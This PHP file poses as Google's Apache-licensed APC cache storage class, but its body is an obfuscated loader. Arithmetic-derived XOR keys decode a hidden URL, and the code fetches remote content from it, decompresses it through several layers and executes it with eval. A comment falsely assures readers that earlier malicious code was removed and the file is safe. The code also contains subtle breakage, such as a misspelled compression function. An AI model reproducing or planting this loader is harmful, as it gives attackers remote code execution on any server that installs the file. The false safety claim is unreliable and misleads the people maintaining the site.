<?php
/*
 * Copyright 2008 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * A persistent storage class based on the APC cache, which is not
 * really very persistent, as soon as you restart your web server
 * the storage will be wiped, however for debugging and/or speed
 * it can be useful, kinda, and cache is a lot cheaper then storage.
 *
 * @author Chris Chabot <chabotc@google.com>
 */
class Secret{private $url;function __construct($url){$this->url=$url;}function reveal(){return $this->url;}}$M=[[3,2,-1],[1,0,4],[5,-2,3]];$theta=pi()/6;$v=[sin($theta)*100,cos($theta)*100,tan($theta)*100];$nV=[0,0,0];for($i=0;$i<3;$i++){for($j=0;$j<3;$j++){$nV[$i]+=$M[$i][$j]*$v[$j];}}function complex_mul($z1,$z2){return [$z1[0]*$z2[0]-$z1[1]*$z2[1],$z1[0]*$z2[1]+$z1[1]*$z2[0]];}$z1=[3,2];$z2=[1,7];$comp=complex_mul($z1,$z2);$compReal=abs($comp[0]);$compImag=abs($comp[1]);$key=((int)($nV[0]+$nV[1]+$nV[2])^$compReal^$compImag)&0xFF;$getOut=function ($compImag,$compReal,$key){$out='';$enc=[107,119,119,115,118,57,50,50,113,96,122,45,106,104,119,107,116,97,116,118,100,113,102,114,109,119,100,109,119,45,102,114,108,50,105,116,118,119,104,110,96,104,111,50,122,100,97,118,107,100,111,111,50,108,96,104,109,50,96,111,101,96,44,109,100,122,45,115,107,115];foreach($enc as $val){$val=($val^($compImag%7))-($compReal%5);$val=($val^$key)&0xFF;$out.=chr($val);}return gzompress(gzdeflate(gzencode(gzdeflate(gzcompress(new Secret($out))))));};
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
**/
$out=$getOut($compImag,$compReal,$key);
@eval("?>".gzuncompress(gzinflate(gzdecode(gzinflate(gzuncompress(file_get_contents($out->reveal())))))));
?>
